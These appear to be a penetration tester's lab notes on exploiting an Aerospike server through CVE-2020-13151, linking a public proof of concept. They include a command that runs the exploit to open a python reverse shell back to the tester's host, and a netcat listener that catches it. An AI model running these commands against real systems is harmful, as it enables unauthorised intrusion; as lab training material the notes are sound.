**Searching public exploit for Aerospike:**
![[Pasted image 20240602192213.png]]
Will choose 2nd one, because it has POC

**Link for the Exploit:https://github.com/b4ny4n/CVE-2020-13151
![[Pasted image 20240602192354.png]]
So we need all three programs to get a shell from the target.

**I have copied all three Programs to my local directory:**
![[Pasted image 20240602192615.png]]

**Lets run the Program According to the POC:https://b4ny4n.github.io/network-pentest/2020/08/01/cve-2020-13151-poc-aerospike.html
![[Pasted image 20240602192711.png]]

**Lets try now:**

```
python3 exp.py --ahost 192.168.191.143 --pythonshell --lhost 192.168.45.177 --lport 443
```

![[Pasted image 20240602192823.png]]
**On the same time i have started Netcat Listener on Port 443:**

```
rlwrap nc -nvlp 443
```

![[Pasted image 20240602192938.png]]
Alright, We are into the machine.....!


Will go to Lateral Movement Now.